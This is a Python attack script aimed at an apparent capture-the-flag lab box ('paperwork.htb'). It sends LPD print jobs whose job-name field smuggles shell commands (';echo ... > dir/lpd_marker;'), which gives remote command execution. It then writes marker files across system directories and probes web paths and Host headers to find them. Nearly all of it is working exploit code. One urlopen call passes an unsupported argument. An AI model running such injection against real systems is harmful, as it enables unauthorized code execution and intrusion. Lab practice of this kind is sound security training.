import socket, time, urllib.request

target = '10.129.248.117'

# First: submit LPD jobs that create detectable files in various locations
def lpd(job_name, timeout=8):
    s = socket.socket()
    s.settimeout(timeout)
    try:
        s.connect((target, 1515))
        s.send(b'\x02archive_intake')
        time.sleep(0.3)
        s.recv(1024)
        ct = (f'J{job_name}\n').encode()
        s.send(b'\x01' + str(len(ct)).encode() + b'\n' + ct)
        time.sleep(0.5)
        s.recv(4096)
        time.sleep(0.3)
        s.recv(4096)
    except:
        pass
    s.close()

# Create marker files in many locations via LPD RCE
marker = f"LPD_WAS_HERE_{int(time.time())}"
print(f"Marker: {marker}", flush=True)

target_dirs = [
    '/tmp', '/var/tmp', '/dev/shm', '/var/www/html',
    '/usr/share/nginx/html', '/var/www', '/home/lp',
    '/opt', '/srv', '/run',
]
for d in target_dirs:
    lpd(f"';echo {marker} > {d}/lpd_marker 2>/dev/null;'")
    time.sleep(0.3)

time.sleep(2)

# Test web server behavior for various paths - look for ANY non-404 response
print("\\n=== Web server path behavior ===", flush=True)
test_paths = [
    '/', '/index.html', '/download/archive',
    '/nonexistent', '/.git/config', '/robots.txt',
    '/api', '/admin', '/console', '/debug',
    '/tmp/', '/tmp', '/tmp/lpd_marker',
    '/var/www/html/lpd_marker',
    '/usr/share/nginx/html/lpd_marker',
    '/home/lp/lpd_marker',
    '/opt/lpd_marker',
    '/lpd_marker',
    '/static/', '/assets/', '/css/',
    '/server-status', '/info.php', '/test.php',
    '/proxy/', '/cgi-bin/',
]

for p in test_paths:
    req = urllib.request.Request(f'http://{target}{p}', headers={'Host': 'paperwork.htb'})
    try:
        resp = urllib.request.urlopen(req, timeout=5)
        body = resp.read().decode(errors='replace')[:200]
        status = resp.status
        if marker in body:
            print(f'!!! MARKER FOUND at {p} (status {status})', flush=True)
        elif status != 404:
            print(f'INTERESTING: {p} -> HTTP {status} ({len(body)} bytes): {body[:80]}', flush=True)
        else:
            pass  # skip 404s
    except urllib.error.HTTPError as e:
        if e.code != 404:
            print(f'HTTP ERROR: {p} -> {e.code}', flush=True)
    except Exception as e:
        print(f'TIMEOUT/ERR: {p} -> {str(e)[:80]}', flush=True)

# Also test with different Host headers on interesting paths
print("\\n=== Host header variations ===", flush=True)
for host in ['127.0.0.1', 'localhost', 'paperwork', 'admin.paperwork.htb']:
    req = urllib.request.Request(f'http://{target}/', headers={'Host': host})
    try:
        resp = urllib.request.urlopen(req, timeout=5, follow_redirects=False)
        print(f'Host: {host:30s} -> {resp.status}', flush=True)
    except urllib.error.HTTPError as e:
        print(f'Host: {host:30s} -> {e.code}', flush=True)
    except Exception as e:
        print(f'Host: {host:30s} -> {str(e)[:60]}', flush=True)

print("\\nDONE", flush=True)
